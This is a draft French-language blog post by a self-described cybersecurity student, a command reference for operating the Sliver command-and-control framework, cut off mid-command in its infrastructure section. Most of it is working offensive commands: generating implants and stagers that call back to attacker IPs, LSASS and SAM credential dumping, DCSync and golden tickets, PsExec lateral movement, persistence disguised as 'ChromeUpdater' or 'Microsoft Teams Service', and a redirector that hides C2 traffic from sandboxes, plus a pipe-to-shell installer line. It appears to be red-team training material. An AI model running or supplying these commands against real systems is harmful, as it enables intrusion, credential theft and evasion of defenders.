---
title: "sliver C2"
date: 2026-03-06T10:00:00+02:00
draft: true
tags: ["pentest", "Active Directory", "PowerView", "reconnaissance", "CRTP", "red team"]
categories: ["Red Team", "pentester"]
summary: ""
showToc: true
tocOpen: true
---

> A Attention:
Je suis un étudiant en cybersécurité. Ce post est personnel et non-professionnel.
Mon analyse peut contenir des erreurs ou des imprécisions, je suis encore en apprentissage. Si vous constatez des erreurs ou si vous avez des suggestions, n'hésitez pas à me contacter !


# Sliver C2 — Référence complète Red Team

> Objectif : référentiel complet pour devenir un opérateur Sliver capable d'évoluer dans des environnements modernes durcis (EDR, ASR, WDAC, AMSI/ETW).

---

## Table des matières

### Partie I — Fondamentaux

1. [Introduction & Concepts](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#1-introduction--concepts)
2. [Cyber Kill Chain & OpSec](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#2-cyber-kill-chain--opsec)
3. [Sliver Architecture](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#3-sliver-architecture)
4. [Installation](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#4-installation)
5. [Multi-Operator (Multiplayer)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#5-multi-operator-multiplayer)

### Partie II — Operations

6. [Armory — Aliases & Extensions](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#6-armory--aliases--extensions)
7. [Listeners (auditeurs)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#7-listeners-auditeurs)
8. [Implants — Generation](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#8-implants--generation)
9. [Stagers](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#9-stagers)
10. [Sessions vs Beacons](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#10-sessions-vs-beacons)
11. [Commandes essentielles dans une session](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#11-commandes-essentielles-dans-une-session)
12. [Execute-Assembly & Inline Execution](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#12-execute-assembly--inline-execution)

### Partie III — Post-Exploitation

13. [Active Directory Enumeration](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#13-active-directory-enumeration)
14. [Privilege Escalation](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#14-privilege-escalation)
15. [Credential Dumping](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#15-credential-dumping)
16. [Lateral Movement](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#16-lateral-movement)
17. [Pivoting & Tunneling](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#17-pivoting--tunneling)
18. [Persistence](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#18-persistence)
19. [Domain Compromise & Trusts](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#19-domain-compromise--trusts)

### Partie IV — Advanced (CRTO II level)

20. [C2 Infrastructure (Redirectors, HTTPS, Failover)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#20-c2-infrastructure-redirectors-https-failover)
21. [Windows APIs & Custom Tooling](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#21-windows-apis--custom-tooling)
22. [Process Injection avancée](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#22-process-injection-avanc%C3%A9e)
23. [Defence Evasion (PPID Spoofing, Cmdline Spoofing, ETW)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#23-defence-evasion-ppid-spoofing-cmdline-spoofing-etw)
24. [Attack Surface Reduction (ASR) Bypass](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#24-attack-surface-reduction-asr-bypass)
25. [Windows Defender Application Control (WDAC) Bypass](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#25-windows-defender-application-control-wdac-bypass)
26. [EDR Evasion (Userland Hooking, Syscalls, Kernel Callbacks)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#26-edr-evasion-userland-hooking-syscalls-kernel-callbacks)
27. [Sleep Mask & In-Memory Obfuscation](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#27-sleep-mask--in-memory-obfuscation)

### Partie V — Detection & Réference

28. [OpSec Checklist (Hacksmarter style)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#28-opsec-checklist-hacksmarter-style)
29. [Détection (Blue Team perspective)](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#29-d%C3%A9tection-blue-team-perspective)
30. [Capstone Project — Workflow complet](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#30-capstone-project--workflow-complet)
31. [Ressources](https://claude.ai/chat/77579af9-52d9-4077-bc69-77e59fade816#31-ressources)

---

# PARTIE I — FONDAMENTAUX

## 1. Introduction & Concepts

### Qu'est-ce qu'un C2 ?

Un **Command & Control (C2)** est un logiciel qui permet à un opérateur red team d'exécuter des commandes ou des binaires sur des machines distantes compromises de façon centralisée :

- Création d'exécutables propres à chaque mission (implants/beacons)
- Établissement d'un canal de communication chiffré
- Gestion centralisée multi-cibles
- Pivoting et mouvement latéral

### Pourquoi Sliver ?

**Sliver** est un C2 open-source développé par **BishopFox**, écrit en **Go** :

- **Cross-compilation native** Windows / Linux / macOS / ARM
- Implants compilés statiquement (no deps)
- Communications chiffrées par défaut
- **Alternative gratuite** à Cobalt Strike
- Protocoles : mTLS, HTTP(S), DNS, WireGuard, Named Pipes, TCP

### C2 majeurs comparés

|C2|Langue|Prix|Usage|
|---|---|---|---|
|**Cobalt Strike**|C/Java|~5500 $/an|Standard commercial|
|**Sliver**|Go|Gratuit|Open-source mature|
|**Mythic**|Python (modulaire)|Gratuit|Multi-agent, web UI|
|**Brute Ratel**|C++|~2500 $/an|EDR-aware|
|**Havoc**|C/Go/C++|Gratuit|Moderne, EDR-aware|
|**Covenant**|C# (.NET)|Gratuit|Déprécié|

### Composants Sliver

- **Server** : héberge listeners, génère implants, gère opérateurs
- **Client** : interface CLI où l'opérateur travaille (local ou distant via mTLS)
- **Implant** : binaire exécuté sur la cible
- **Beacon** : implant en mode check-in périodique (OpSec friendly)
- **Stager** : petit code qui télécharge et exécute l'implant complet

---

## 2. Cyber Kill Chain & OpSec

### Cyber Kill Chain (Lockheed Martin, 2011)

|Phase|Description|
|---|---|
|**Reconnaissance**|Collecte d'infos sur la cible|
|**Weaponization**|Développement de la payload|
|**Delivery**|Transfert payload sur la cible|
|**Exploitation**|Exécution de la payload|
|**Installation**|Établissement du foothold (implant déployé)|
|**Command & Control**|Communication établie|
|**Actions on Objectives**|Exfiltration / mouvement latéral|

### MITRE ATT&CK — pour les red teamers

Le framework MITRE ATT&CK référence les **TTPs (Tactics, Techniques, Procedures)** par phase. À utiliser conjointement avec Sliver pour :

- Mapper chaque action à une technique ATT&CK
- Documenter ses TTPs dans le rapport
- Anticiper les détections (chaque technique a des sigma rules associées)

### OpSec — Operational Security

Aspect fondamental absent de la Kill Chain originale :

- Choisir le bon protocole (HTTPS pour blend-in)
- Limiter les child processes (`--in-process`, BOFs)
- Intervalles beacon réalistes (`--seconds`, `--jitter`)
- Privilégier inline execution
- Renommer binaires, masquer strings reconnaissables
- **Hypothèse** : un EDR moderne tourne sur la cible, agir comme tel

---

## 3. Sliver Architecture

### Architecture typique d'engagement red team

```
                            INTERNET
                                │
    ┌───────────────┐           │           ┌─────────────┐
    │  Operator(s)  │◄──mTLS────┤           │   Target    │
    │   (client)    │           │           │   network   │
    └───────────────┘           │           └─────────────┘
                                │                  │
                          ┌─────┴────┐             │
                          │ Redirector│             │
                          │ (Apache/  │             │
                          │  Nginx)   │             │
                          └─────┬────┘             │
                                │                   │
                          ┌─────┴────┐              │
                          │  Sliver  │◄────HTTPS────┘
                          │  Server  │   (beacon traffic)
                          └──────────┘
```

### Composants

1. **Sliver Server** : backend (gère implants, listeners, sessions, beacons)
2. **Redirector** : VPS public (Apache/Nginx en mod_rewrite) qui forward vers le serveur réel
3. **Sliver Client** : CLI utilisé par les opérateurs (peuvent être plusieurs en multiplayer)
4. **Implant** : binaire malicieux sur la cible

### Intérêt du redirector

- Cache l'IP du serveur Sliver (résilience si blocage)
- Permet de filtrer le trafic suspect avant qu'il atteigne le C2
- Filtres possibles : User-Agent, URI, IP source, etc.
- Peut servir plusieurs C2 (Sliver + autre)

---

## 4. Installation

### Server — Linux

```bash
# Téléchargement du dernier binaire
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x ./sliver-server_linux

# One-liner officiel (alternative)
curl https://sliver.sh/install | sudo bash

# Premier lancement (déballage des assets)
./sliver-server_linux
```

### Prompts CLI

- `[server] sliver >` → console serveur
- `sliver >` → console client
- `sliver (BEACON_NAME) >` → contexte d'un beacon
- `sliver (session http) >` → contexte d'une session interactive

### Client — Linux

```bash
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import <profile.cfg>
./sliver-client_linux
```

### Vérification & maintenance

```sliver
update                # Vérifier mises à jour
version               # Version actuelle
licenses              # Licences
exit                  # Quitter
```

---

## 5. Multi-Operator (Multiplayer)

Sliver supporte le mode **multiplayer** : plusieurs opérateurs en parallèle.

### Activer le multiplayer

```sliver
[server] sliver > multiplayer
[*] Multiplayer mode enabled!
```

### Créer un nouvel opérateur

```sliver
[server] sliver > new-operator -n student -l 10.10.14.193
[*] Saved new client config to: /home/user/student_10.10.14.193.cfg
```

Flags :

- `-n` / `--name` : nom de l'opérateur
- `-l` / `--lhost` : IP du serveur Sliver
- `-p` / `--lport` : port (défaut 31337)
- `-s` / `--save` : chemin de sauvegarde

### Importer le profil côté client

```bash
./sliver-client_linux import student_10.10.14.193.cfg
```

### Gestion opérateurs

```sliver
operators                     # Liste
kick <operator_name>          # Déconnecter
```

---

# PARTIE II — OPERATIONS

## 6. Armory — Aliases & Extensions

L'**Armory** est la bibliothèque de **binaires .NET précompilés** et utilitaires red team distribuée avec Sliver.

- **Aliases** : binaires .NET (Seatbelt, Rubeus…) exécutés via `execute-assembly`
- **Extensions** : BOFs (Beacon Object Files) — code compilé exécuté **in-process** (OpSec++)

### Commandes Armory

```sliver
sliver > armory                    # Lister les outils disponibles
sliver > armory --help
sliver > armory install all        # Tout installer (~20 aliases + 106 extensions)
sliver > armory install seatbelt   # Installer un seul outil
sliver > armory search <regex>
sliver > armory update
```

### Aliases populaires (binaires .NET)

|Alias|Utilité|
|---|---|
|`Seatbelt`|Énumération situational awareness Windows|
|`Rubeus`|Attaques Kerberos (Kerberoasting, AS-REP, S4U…)|
|`SharpUp`|Privilege escalation Windows|
|`SharpView`|Énumération AD (PowerView en C#)|
|`SharpHound` (v3/v4)|Collecte BloodHound|
|`Certify`|Attaques ADCS (ESC1-8)|
|`SharpDPAPI`|Décryption DPAPI|
|`SharpChrome`|Extraction credentials Chrome|
|`SharpRDP`|Exécution via RDP|
|`SharpLAPS`|Lecture mots de passe LAPS|
|`SharPersist`|Persistance Windows|
|`SharpSecDump`|Dump SAM/SECRETS|
|`SharpSMBExec`|Lateral movement SMB|
|`SharpWMI`|Lateral movement WMI|
|`KrbRelayUp`|Relay Kerberos privesc|
|`NoPowerShell`|Cmdlets PowerShell sans powershell.exe|
|`sharpsh`|Loader scripts PowerShell|
|`sqlrecon`|Énumération MSSQL|

### Extensions populaires (BOFs)

|Extension|Utilité|
|---|---|
|`c2tc-domaininfo`|Énumération domaine via BOF|
|`c2tc-kerberoast`|Kerberoasting via BOF|
|`nanodump`|Dump LSASS minimal et furtif|
|`bof-roast`|Roasting via BOF|
|`inline-execute-assembly`|Exécution .NET sans child process|
|`sa-sharpup`|Privesc via BOF|

---

## 7. Listeners (auditeurs)

Un listener "écoute" les connexions des implants. Il **doit** correspondre au protocole utilisé pour générer l'implant.

### Démarrage de listeners

```sliver
# HTTP
sliver > http --lhost 10.10.14.62 --lport 8088
sliver > http -L 10.10.14.62 -l 8088

# HTTPS (cert auto-signé par défaut)
sliver > https --lhost 10.10.14.62 --lport 443

# HTTPS avec cert custom (IMPORTANT pour OpSec)
sliver > https --lhost 10.10.14.62 --lport 443 \
    --cert /etc/letsencrypt/live/c2.domain.com/fullchain.pem \
    --key /etc/letsencrypt/live/c2.domain.com/privkey.pem

# mTLS
sliver > mtls --lhost 10.10.14.62 --lport 8888

# DNS (nécessite domaine NS pointant vers le serveur)
sliver > dns --domains example.com.

# Stage listener (pour stagers Meterpreter-style)
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb

# WireGuard
sliver > wg --lport 51820

# Named pipe (pivot, depuis un implant)
sliver (beacon) > pivots named-pipe --bind academy

# TCP pivot
sliver (beacon) > pivots tcp --bind 0.0.0.0:9898
```

### Gestion des jobs

```sliver
sliver > jobs                 # Lister
sliver > jobs -k <id>         # Tuer un job
sliver > jobs -K              # Tuer tous les jobs
```

---

## 8. Implants — Generation

### Modes

- **Session** : connexion temps réel (style Meterpreter)
- **Beacon** : check-in périodique (recommandé OpSec)

### Génération d'un beacon HTTP

```sliver
sliver > generate beacon --http 10.10.14.62:8088 --skip-symbols -N http_beacon --os windows
[*] Implant saved to /home/user/http_beacon.exe
```

### Flags importants

|Flag|Description|
|---|---|
|`--mtls`|Listener mTLS|
|`--http`|Listener HTTP/HTTPS|
|`--dns`|Listener DNS|
|`--named-pipe`|Pivot via named pipe (Windows)|
|`--tcp-pivot`|Pivot via TCP|
|`--os`|windows / linux / darwin|
|`--arch`|amd64 / 386 / arm / arm64|
|`--format`|exe / shellcode / shared (DLL) / service|
|`-N` / `--name`|Nom de l'implant|
|`--skip-symbols`|Désactive obfuscation Go (binaire plus petit)|
|`--evasion`|Tente bypass certains AV|
|`--debug`|Logs (pour dev)|
|`-s` / `--save`|Chemin de sauvegarde|
|`--seconds`|Intervalle de beacon|
|`--jitter`|Jitter (variation %)|
|`-c` / `--canary`|Domaines canary DNS|
|`--limit-username`|N'exécute que sous un user spécifique|
|`--limit-hostname`|N'exécute que sur un host spécifique|
|`--limit-domainjoined`|N'exécute que si domain-joined|

### Exemples de génération

```sliver
# Beacon HTTP obfusqué
sliver > generate beacon --http 10.10.14.62 -N http_beacon_obf --os windows

# Beacon mTLS Linux
sliver > generate beacon --mtls 10.10.14.62:8888 --os linux --arch amd64 -N linux_implant

# Implant session DNS
sliver > generate --dns example.com --os windows -N dns_session

# Shellcode pour injection
sliver > generate --http 10.10.14.62 --format shellcode --os windows -N sc_x64

# Service binary (pour PsExec)
sliver > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# DLL pour DLL hijacking / sideloading
sliver > generate --http 10.10.14.62 --format shared -N stealth.dll

# Beacon avec restrictions OpSec (limit-*)
sliver > generate beacon --https c2.domain.com --limit-domainjoined --os windows -N corp_beacon
```

### Lister / régénérer / supprimer

```sliver
sliver > implants
sliver > regenerate <name>
sliver > implants rm <name>
```

### Profils (configurations réutilisables)

```sliver
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb
sliver > profiles
sliver > profiles generate htb
sliver > profiles rm htb
```

---

## 9. Stagers

Les stagers réduisent la taille de la payload initiale (utile pour shellcode injection / phishing).

### Workflow stager

```sliver
# 1. Profil shellcode
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb

# 2. Stage listener
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb

# 3. Listener du second-stage
sliver > http -L 10.10.14.62 -l 8088

# 4. Génération du stager
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

### Formats stager

- `c` (C buffer)
- `csharp` (byte array C#)
- `bash`
- `powershell`
- `vbscript`
- `python`
- `raw`

---

## 10. Sessions vs Beacons

### Sessions (interactives)

- Connexion temps réel
- **Moins OpSec** (trafic constant)
- Idéales pour exploration rapide

```sliver
sliver > sessions
sliver > use 06ff8ed9-5a6b-4eca-ba88-…
sliver (HIGH_RISER) > info
sliver > sessions -k <id>
```

### Beacons (asynchrones)

- Check-in périodique
- **OpSec** : blend dans le trafic normal
- Tâches en file d'attente

```sliver
sliver > beacons
sliver > use <beacon_id>
sliver (beacon) > tasks
sliver (beacon) > tasks fetch <task_id>
sliver (beacon) > tasks cancel <task_id>
sliver (beacon) > interactive            # Convertir en session
```

### Reconfigurer un beacon

```sliver
sliver (beacon) > reconfig --beacon-interval 30s --beacon-jitter 10s
```

---

## 11. Commandes essentielles dans une session

### Filesystem

```sliver
sliver (session) > pwd / cd / ls / cat
sliver (session) > mkdir / rm / mv
sliver (session) > chmod / chown
```

### Upload / Download

```sliver
sliver (session) > download academy.txt
sliver (session) > download C:\\Users\\eric\\Desktop\\file.txt /tmp/
sliver (session) > upload /tmp/tool.exe C:\\Windows\\Temp\\
```

### Process management

```sliver
sliver (session) > ps                    # Tous processus
sliver (session) > ps -e notepad         # Filtrer par nom
sliver (session) > ps -p 1234            # Par PID
sliver (session) > ps -T                 # Avec threads
sliver (session) > terminate <pid>
sliver (session) > getpid / getuid / whoami
```

### Réseau

```sliver
sliver (session) > ifconfig
sliver (session) > netstat -t / -u / -l
```

### Système

```sliver
sliver (session) > info                  # Infos détaillées
sliver (session) > screenshot
sliver (session) > registry read HKLM\\...
sliver (session) > registry write ...
sliver (session) > services
sliver (session) > env / date
```

### Shell

```sliver
sliver (session) > shell                 # ⚠️ BRUYANT
sliver (session) > execute -o cmd.exe /c whoami /all
sliver (session) > execute powershell -nop -c "Get-Process"
```

⚠️ `shell` spawn cmd.exe enfant — détectable. Préférer `execute` ou BOFs.

---

## 12. Execute-Assembly & Inline Execution

### `execute-assembly`

Charge et exécute un assembly .NET dans un process **enfant** (par défaut notepad.exe).

```sliver
sliver (session) > execute-assembly Seatbelt.exe -group=system
sliver (session) > execute-assembly /home/user/SharpCollection/Rubeus.exe kerberoast
```

#### Flags

|Flag|Description|
|---|---|
|`-i` / `--in-process`|Dans le process Sliver (OpSec++, risque crash)|
|`-p` / `--process`|Process hôte custom|
|`-A` / `--process-arguments`|Args du process hôte|
|`-P` / `--ppid`|PID parent (parent spoofing)|
|`-c` / `--class`|Classe à exécuter|
|`-m` / `--method`|Méthode|
|`-X` / `--loot`|Sauver dans loot store|
|`--amsi-bypass`|Bypass AMSI|
|`--etw-bypass`|Bypass ETW|

### Exécuter directement un alias

```sliver
sliver > seatbelt -- -group=system
sliver > rubeus -- kerberoast /outfile:hashes.txt
sliver > sharpup -- audit
sliver > sharpview -- Get-DomainSid -Domain htb.local
sliver > sharp-hound-4 -- -c All --zipfilename academy
```

### `inline-execute-assembly` (BOF — OpSec++)

Exécute du .NET **dans le process Sliver** :

```sliver
sliver (session) > inline-execute-assembly /home/user/SpoolSample.exe 'dc01 srv01'
```

### `execute-shellcode`

```sliver
sliver (session) > execute-shellcode -p 5668 /home/user/godpotato.bin
```

### `sideload` — DLL sideloading

```sliver
sliver (session) > sideload -p notepad.exe /home/user/payload.dll
```

### `spawndll` — Reflective DLL injection

```sliver
sliver (session) > spawndll -p explorer.exe /home/user/inject.dll
```

### `migrate` — Migration de process

```sliver
sliver (session) > migrate <pid>
```

⚠️ Migration suspecte vers process système. Préférer process utilisateur stable.

---

# PARTIE III — POST-EXPLOITATION

## 13. Active Directory Enumeration

### SharpView (PowerView en C#)

```sliver
sliver > sharpview -- Get-Domain
sliver > sharpview -- Get-DomainSid -Domain htb.local
sliver > sharpview -- Get-DomainController
sliver > sharpview -- Get-DomainUser -SPN                   # Kerberoastables
sliver > sharpview -- Get-DomainUser -PreauthNotRequired    # AS-REP
sliver > sharpview Get-NetComputer -TrustedToAuth           # Délégation
sliver > sharpview -- Get-DomainTrust
sliver > sharpview -- Get-DomainGPO
```

### SharpHound (BloodHound collection)

```sliver
sliver > sharp-hound-4 -- -c All --zipfilename academy
sliver > sharp-hound-4 -- -c DCOnly --zipfilename dconly         # Stealth
sliver > sharp-hound-4 -- -c Session,LoggedOn
```

Téléchargement :

```sliver
sliver (session) > download 20231110100403_academy.zip
```

### Seatbelt (situational awareness)

```sliver
sliver > seatbelt -- -group=system
sliver > seatbelt -- -group=user
sliver > seatbelt -- -group=all
sliver > seatbelt -- LogonSessions LSASettings PowerShell
```

### BOFs d'énumération (OpSec)

```sliver
sliver > c2tc-domaininfo
sliver > whoami
sliver > netstat
```

### Énumération native Sliver

```sliver
sliver (session) > ls //srv01.child.htb.local/c$
sliver (session) > services
```

---

## 14. Privilege Escalation

### Énumération

```sliver
sliver > sharpup -- audit
sliver > seatbelt -- -group=system
sliver > execute-assembly /home/user/winPEAS.exe
```

### Token impersonation

```sliver
sliver (session) > getsystem
sliver (session) > impersonate <user>
sliver (session) > rev2self
sliver (session) > make-token -u user -p password -d domain
```

### Potato attacks (SeImpersonate)

```sliver
# GodPotato (Win10/11/2019/2022)
sliver > execute-assembly /home/user/GodPotato-NET4.exe -cmd "whoami"

# Via shellcode in-process
sliver (session) > execute-shellcode -p 5668 /home/user/godpotato.bin
```

### Workflow privesc → SYSTEM

```sliver
# 1. Énumération
sliver > sharpup -- audit

# 2. Vérifier privilèges
sliver > whoami /priv

# 3. Si SeImpersonate → Potato
sliver > execute-assembly GodPotato-NET4.exe -cmd "C:\\Windows\\Temp\\beacon.exe"

# 4. Listener up + nouveau beacon SYSTEM
```

---

## 15. Credential Dumping

### Hashdump (SAM local)

```sliver
sliver (session) > hashdump
```

### LSASS dump avec procdump

```sliver
sliver (session) > ps -e lsass
sliver (session) > procdump --pid 660 --save /tmp/lsass.dmp
```

Parse offline :

```bash
pypykatz lsa minidump /tmp/lsass.dmp
```

### LSASS furtif avec nanodump (BOF)

```sliver
sliver (session) > nanodump 656 web01-lsass 1 PMDM
sliver (session) > download web01-lsass
```

### SharpDPAPI (Chrome, vault, masterkeys)

```sliver
sliver > sharpdpapi -- triage
sliver > sharpchrome -- logins
sliver > sharpchrome -- cookies
```

### LAPS

```sliver
sliver > sharplaps -- /user:Administrator
```

### SharpSecDump (équivalent secretsdump.py)

```sliver
sliver > sharpsecdump -- -target=DC01.htb.local
```

### Rubeus (Kerberos)

```sliver
# Kerberoasting
sliver > rubeus -- kerberoast /outfile:hashes.txt /nowrap

# AS-REP Roasting
sliver > rubeus -- asreproast /format:hashcat /outfile:asrep.txt

# Pass-the-Ticket
sliver > rubeus -- ptt /ticket:doIFvjCCBb...

# S4U abuse
sliver > rubeus -- s4u /user:svc /rc4:hash /impersonateuser:admin /msdsspn:cifs/dc01
```

### Bof-roast (BOF Kerberoast)

```sliver
sliver (session) > bof-roast rdp/web01.child.htb.local
```

---

## 16. Lateral Movement

### Workflow PsExec via Sliver

```sliver
# 1. Pivot listener
sliver (beacon) > pivots tcp --bind 0.0.0.0:9898

# 2. Implant en format service
sliver > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# 3. PsExec
sliver (beacon) > psexec --custom-exe /home/user/psexec-pivot.exe \
    --service-name Teams --service-description "Microsoft Teams Service" \
    --hostname srv01.child.htb.local
```

### Flags `psexec`

- `--custom-exe`
- `--service-name`
- `--service-description`
- `--hostname`

### SharpWMI / SharpRDP / SharpSMBExec

```sliver
sliver > sharp-wmi -- action=exec computername=srv02 command="powershell.exe ..."
sliver > sharp-rdp -- computername=srv03 command="cmd.exe /c whoami" username=user password=pass
sliver > sharp-smbexec -- /target:srv01 /username:admin /hash:8846f... /command:"whoami"
```

### Via SOCKS + Impacket

```bash
proxychains impacket-psexec child/svc_sql:Pass@10.0.0.1
proxychains impacket-wmiexec child/svc_sql:Pass@10.0.0.1
```

### make-token + lateral direct

```sliver
sliver (session) > make-token -u svc_sql -p Password123 -d child.htb.local
sliver (session) > ls //srv01.child.htb.local/c$
sliver (session) > psexec --custom-exe pivot.exe --hostname srv01
sliver (session) > rev2self
```

---

## 17. Pivoting & Tunneling

### Named Pipe Pivot (Windows)

```sliver
sliver (http_beacon) > pivots named-pipe --bind academy
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
```

### TCP Pivot

```sliver
sliver (beacon) > pivots tcp --bind 0.0.0.0:9898
sliver > generate --tcp-pivot 172.16.1.11:9898 -N tcp_pivot
```

### Lister pivots

```sliver
sliver > pivots
```

### SOCKS5 Proxy

```sliver
sliver (beacon) > socks5 start -P 1080
```

`/etc/proxychains.conf` :

```
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn 172.16.1.0/24
```

```sliver
sliver (beacon) > socks5 stop
```

### Reverse Port Forwarding

```sliver
sliver (beacon) > rportfwd add -b 8080 -r 127.0.0.1:8080
sliver (beacon) > rportfwd
sliver (beacon) > rportfwd rm <id>
```

### Port Forwarding

```sliver
sliver (session) > portfwd add -b 0.0.0.0:8080 -r 10.10.10.10:80
sliver (session) > portfwd
```

### Chisel

```sliver
sliver (beacon) > chisel client 10.10.14.62:1337 R:socks
```

Côté attaquant :

```bash
chisel server -p 1337 --reverse
```

### WireGuard (built-in)

```sliver
sliver > wg --lport 51820
sliver > wg-config
sliver > wg-portfwd add --remote 172.16.1.11:3389
sliver > wg-portfwd
sliver > wg-socks
```

---

## 18. Persistence

### Scheduled Task

```sliver
sliver (session) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr C:\\Windows\\Temp\\beacon.exe'
```

### SharPersist

#### Startup folder

```sliver
sliver > sharpersist -- -t startupfolder -c "powershell.exe" \
    -a "-nop -w hidden -enc <BASE64>" -f "ChromeUpdater" -m add
```

#### Registry Run keys

```sliver
sliver > sharpersist -- -t reg -c "powershell.exe" \
    -a "-nop -w hidden iex(...)" \
    -k "hkcurun" -v "ChromeUpdater" -m add

sliver > sharpersist -- -t reg -k "hklmrun" -m list
sliver > sharpersist -- -t reg -k "hkcurun" -v "ChromeUpdater" -m remove
```

#### Scheduled task

```sliver
sliver > sharpersist -- -t schtaskbackdoor -c "powershell.exe" \
    -a "-nop -enc <B64>" -n "SystemHealthCheck" -m add
```

#### WMI persistence

```sliver
sliver > sharpersist -- -t wmi -c "powershell.exe" \
    -a "-nop -enc <B64>" -n "WMIUpdate" -m add
```

### Service persistence

```sliver
sliver > generate --format service ...
sliver (session) > execute -o cmd.exe /c "sc create UpdateSvc binPath= C:\\path\\implant.exe start= auto"
```

---

## 19. Domain Compromise & Trusts

### DCSync

```sliver
sliver > sharpsecdump -- -just-dc -target=DC01.htb.local
sliver > execute-assembly Mimikatz.exe "lsadump::dcsync /domain:htb.local /user:krbtgt"
```

### Golden Ticket

```sliver
sliver > rubeus -- golden /aes256:<krbtgt_aes256> /user:Administrator \
    /domain:htb.local /sid:<domain_sid> /ptt
```

### Silver Ticket

```sliver
sliver > rubeus -- silver /aes256:<service_hash> /user:Administrator \
    /service:cifs /target:srv01.htb.local /domain:htb.local /sid:<sid> /ptt
```

### Trusts

```sliver
sliver > sharpview -- Get-DomainTrust
sliver > sharpview -- Get-ForestTrust
```

### Inter-forest (SID History abuse)

```sliver
sliver > rubeus -- golden /aes256:<krbtgt> /user:Admin /domain:child.htb.local \
    /sid:<child_sid> /sids:<enterprise_admins_sid_in_root> /ptt
```

### ADCS — ESC1-8 avec Certify

```sliver
sliver > certify -- find
sliver > certify -- find /vulnerable

# ESC1 — Subject Alternative Name
sliver > certify -- request /ca:CA01.htb.local\\htb-CA \
    /template:VulnerableTemplate /altname:Administrator

# Conversion en TGT
sliver > rubeus -- asktgt /user:Administrator /certificate:cert.pfx /ptt
```

---

# PARTIE IV — ADVANCED (CRTO II level)

> Cette partie reprend les concepts du **Red Team Ops II** transposés à Sliver. Le CRTO II est centré sur Cobalt Strike, mais ses techniques s'appliquent à tout C2 moderne.

## 20. C2 Infrastructure (Redirectors, HTTPS, Failover)

### Architecture résiliente

```
   ┌─────────────┐
   │  Operator   │
   └──────┬──────┘
          │ mTLS (port 31337)
          │
   ┌──────┴──────────────────────┐
   │  TEAM SERVER (Sliver)        │
   │  - Listeners HTTPS sur :443  │
   │  - Hidden behind firewall    │
   └──────┬───────────────────────┘
          │
          │ Backend HTTPS
          │
   ┌──────┴──────────────────────┐
   │  REDIRECTORS (VPS publics)   │
   │  - Apache mod_rewrite        │
   │  - Filtrage User-Agent / URI │
   │  - Domain fronting (CDN)     │
   └──────┬───────────────────────┘
          │
          │ HTTPS (cert valide)
          │
   ┌──────┴──────────────────────┐
   │       VICTIM NETWORK         │
   └──────────────────────────────┘
```

### Redirector Apache (config type)

```apache
<VirtualHost *:443>
    ServerName c2.legitlooking.com
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/c2.../fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/c2.../privkey.pem

    RewriteEngine On
    # Bloque les User-Agents suspects (sandboxes)
    RewriteCond %{HTTP_USER_AGENT} ^$ [OR]
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|nmap) [NC]
    RewriteRule .* https://www.microsoft.com/? [L,R=302]

    # Forward des URIs C2 légitimes
    RewriteCond %{REQUEST_URI} ^/(jquery|cdn|api/v1)
    RewriteRule ^.*$ https://10.10.10.5%{REQUEST_URI} [P,L]

    # Tout le reste : redirect vers site légitime
    RewriteRule .* https://www.microsoft.com/? [L,R=302]
</VirtualHost>
```

### Domain fronting / CDN

Utiliser des CDN (Cloudflare, AWS CloudFront, Azure Front Door) pour cacher l'origine du trafic. ⚠️ Cloudflare interdit le domain fronting depuis 2018 — vérifier le ToS du provider.

### Cert TLS valide (Let's Encrypt)

```bash
certbot certonly --standalone -d c2.legitlooking.com
```

Puis dans Sliver :

```sliver
sliver > https --lhost 0.0.0.0 --lport 443 \
    --cert /etc/letsencrypt/live/c2.../fullchain.pem \
